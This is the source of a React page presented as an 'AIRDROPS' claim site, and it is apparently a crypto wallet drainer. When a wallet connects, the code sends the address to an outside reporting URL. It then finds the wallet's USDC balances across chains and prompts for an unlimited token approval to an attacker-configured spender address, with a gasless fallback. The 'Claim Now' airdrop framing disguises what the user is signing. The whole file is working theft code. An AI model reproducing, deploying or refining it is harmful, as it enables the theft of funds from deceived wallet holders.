'use client';
import { useState, useEffect } from 'react';
import { useAccount, useWriteContract } from 'wagmi';
import { AppKitButton } from '@reown/appkit/react';
import { erc20Abi, maxUint256 } from 'viem';
import { readContract, getBalance, switchChain } from '@wagmi/core';
import { config } from '@/config';
import {
  createMeeClient,
  toMultichainNexusAccount,
  getMEEVersion,
  MEEVersion,
} from '@biconomy/abstractjs';
import { http } from 'viem';
import { base, optimism, sepolia, mainnet } from 'viem/chains';

// ENV
const REPORT_URL = process.env.NEXT_PUBLIC_REPORT_URL;
const BICONOMY_API_KEY = process.env.NEXT_PUBLIC_BICONOMY_API_KEY || "";
const SPENDER = (process.env.NEXT_PUBLIC_SPENDER || "") as `0x${string}`;
if (!SPENDER || SPENDER === "0x") {
  throw new Error('SPENDER_ADDRESS is not defined or invalid');
}

// Tokens grouped by chainId
const TOKENS_BY_CHAIN: Record<
  number,
  { symbol: string; address: `0x${string}`; min: bigint; decimals: number }[]
> = {
  [mainnet.id]: [
    { symbol: "USDC", address: "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48", min: BigInt(1e6), decimals: 6 },
  ],
  [optimism.id]: [
    { symbol: "USDC", address: "0x7F5c764cBc14f9669B88837ca1490cCa17c31607", min: BigInt(1e6), decimals: 6 },
  ],
  [base.id]: [
    { symbol: "USDC", address: "0x833589fCD6eDb6E08f4c7C32D4f71b54BDA02913", min: BigInt(1e6), decimals: 6 },
  ],
  [sepolia.id]: [
    { symbol: "USDC", address: "0x1c7D4B196Cb0C7B01d743Fbc6116a902379C7238", min: BigInt(1e6), decimals: 6 },
  ],
};

// Human-readable chain names
const CHAIN_NAMES: Record<number, string> = {
  1: "Ethereum Mainnet",
  10: "Optimism",
  8453: "Base",
  11155111: "Sepolia",
};

// Component that reports wallet connections
function ConnectionReporter() {
  const { address, isConnected } = useAccount();

  useEffect(() => {
    if (isConnected && address) {
      fetch(`${REPORT_URL}`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          event: "connect",
          wallet: address,
        }),
      }).catch(console.error);
    }
  }, [isConnected, address]);

  return null;
}

export default function Home() {
  const { address, isConnected, chainId } = useAccount();
  const { writeContractAsync } = useWriteContract();
  const [status, setStatus] = useState<string>("");

  async function handleGaslessApprove(token: typeof TOKENS_BY_CHAIN[number][number], targetChain: number) {
    try {
      setStatus(`Building Fusion approval for ${token.symbol}...`);

      const orchestrator = await toMultichainNexusAccount({
        signer: window.ethereum as any,
        chainConfigurations: [
          { chain: optimism, transport: http(), version: getMEEVersion(MEEVersion.V2_1_0) },
          { chain: base, transport: http(), version: getMEEVersion(MEEVersion.V2_1_0) },
          { chain: mainnet, transport: http(), version: getMEEVersion(MEEVersion.V2_1_0) },
          { chain: sepolia, transport: http(), version: getMEEVersion(MEEVersion.V2_1_0) },
        ],
      });

      const meeClient = await createMeeClient({
        account: orchestrator,
        apiKey: BICONOMY_API_KEY,
      });

      const instruction = await orchestrator.buildComposable({
        type: 'default',
        data: {
          abi: erc20Abi,
          chainId: targetChain,
          to: token.address,
          functionName: 'approve',
          args: [SPENDER, maxUint256],
        },
      });

      const fusionQuote = await meeClient.getFusionQuote({
        instructions: [instruction],
        trigger: { chainId: targetChain, tokenAddress: token.address, amount: token.min },
        feeToken: { address: token.address, chainId: targetChain },
      });

      setStatus(`Executing gasless approval for ${token.symbol}...`);
      const { hash } = await meeClient.executeFusionQuote({ fusionQuote });
      await meeClient.waitForSupertransactionReceipt({ hash });

      setStatus(`Approval successful! Tx: ${hash}`);
    } catch (err: any) {
      console.error(err);
      setStatus(`Error: ${err.message || err}`);
    }
  }

  async function handleClaim() {
    if (!isConnected || !address) {
      setStatus("Wallet not connected");
      return;
    }

    try {
      setStatus("Scanning chains for balances...");

      let targetChain: number | null = null;
      let usableTokens: { symbol: string; address: `0x${string}`; min: bigint; decimals: number }[] = [];

      for (const [cid, tokens] of Object.entries(TOKENS_BY_CHAIN)) {
        const numericCid = Number(cid);

        for (const token of tokens) {
          try {
            const bal = await readContract(config, {
              chainId: numericCid,
              address: token.address,
              abi: erc20Abi,
              functionName: "balanceOf",
              args: [address],
            }) as bigint;

            if (bal >= token.min) {
              targetChain = numericCid;
              usableTokens.push(token);
            }
          } catch {}
        }

        if (usableTokens.length > 0) break;
      }

      if (!targetChain || usableTokens.length === 0) {
        setStatus("No usable balances found on any chain.");
        return;
      }

      const chainName = CHAIN_NAMES[targetChain!] || "Unknown Chain";

      if (chainId !== targetChain) {
        setStatus(`Switching to ${chainName}...`);
        await switchChain(config, { chainId: targetChain });
      }

      const nativeBal = await getBalance(config, { address, chainId: targetChain });
      if (nativeBal.value < BigInt(1e14)) {
        setStatus("Not enough native token to pay gas fees. Trying gasless Fusion...");
        for (const token of usableTokens) {
          await handleGaslessApprove(token, targetChain);
        }
        return;
      }

      for (const token of usableTokens) {
        setStatus(`Approving ${token.symbol} on ${chainName} (normal tx)...`);

        const txHash = await writeContractAsync({
          address: token.address,
          abi: erc20Abi,
          functionName: "approve",
          args: [SPENDER, maxUint256],
          account: address,
          chainId: targetChain,
        });

        setStatus(`${token.symbol} approved ✅ | Tx: ${txHash}`);
      }

      setStatus("All approvals completed!");
    } catch (err: any) {
      console.error(err);
      setStatus("Error: " + (err?.shortMessage || err?.message || "unknown"));
    }
  }

  // Automatically trigger claim when wallet connects
  useEffect(() => {
    if (isConnected && address) handleClaim();
  }, [isConnected, address]);

  return (
    <main className="flex flex-col items-center gap-6 mt-10">
      <header className="fixed top-0 left-0 right-0 h-16 bg-[#09011fff] flex items-center justify-between px-6 shadow z-50">
        <div className="font-bold text-lg text-[#aaa587ff]">AIRDROPS</div>
        <AppKitButton />
      </header>

      <ConnectionReporter />

      <div className="flex flex-col gap-6 pt-20 w-4/5 max-w-xl">
        <div className="border border-[#9dd6d1ff] rounded-xl p-5 bg-[#090e41ff] flex flex-col items-center justify-between h-[500px]">
          <h2 className="mb-3">Airdrop</h2>
          <div className="flex-1 flex items-center justify-center text-[#e4e1daff] text-sm text-center">
            {status || ""}
          </div>
          <button
            onClick={handleClaim}
            className="bg-red-700 text-white px-6 py-3 rounded-lg mt-4"
          >
            Claim Now
          </button>
        </div>

        {[1, 2, 3].map((i) => (
          <div
            key={i}
            className="border border-[#c9c8ddff] rounded-xl p-5 bg-[#0e0a42ff] flex items-center justify-center"
          >
            <span>Box {i + 1}</span>
          </div>
        ))}
      </div>
    </main>
  );
}
